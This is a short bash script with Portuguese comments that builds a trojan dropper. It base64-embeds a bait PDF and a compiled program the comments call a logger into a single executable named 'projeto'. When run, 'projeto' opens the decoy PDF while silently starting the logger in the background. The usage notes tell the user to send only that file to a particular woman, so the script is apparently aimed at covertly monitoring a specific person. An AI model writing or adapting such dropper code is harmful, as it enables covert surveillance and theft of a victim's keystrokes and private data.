#!/bin/bash

# Como usar:
# 1. Coloque este script na mesma pasta que:
#    - teste.pdf (seu PDF)
#    - prog_test (seu programa C compilado)
# 2. Execute: ./script.sh
# 3. O arquivo "projeto" será gerado
# 4. Envie APENAS o "projeto" para ela
# ============================================

# Codifica os arquivos em base64
PDF_B64=$(base64 -w0 teste.pdf) # Codifica o arquivo bait
PROG_B64=$(base64 -w0 prog_test) # Codifica o logger


# Gera o conteúdo e arquivo final - Nome: Projeto
cat > projeto << 'EOF'

#!/bin/bash
PDF_B64="SUBSTITUIR_PDF"
PROG_B64="SUBSTITUIR_PROG"

# Decodifica os arquivos codificados
echo "$PDF_B64" | base64 -d > /tmp/real.pdf
echo "$PROG_B64" | base64 -d > /tmp/prog_test

# Permite a execução do logger
chmod +x /tmp/prog_test

# Abre o pdf no executor padrão
xdg-open /tmp/real.pdf &

# Executa o logger
/tmp/prog_test &

exit 0
EOF

# Substitui os placeholders pelos valores reais
sed -i "s|SUBSTITUIR_PDF|$PDF_B64|" projeto
sed -i "s|SUBSTITUIR_PROG|$PROG_B64|" projeto

# Dá permissão de execução
chmod +x projeto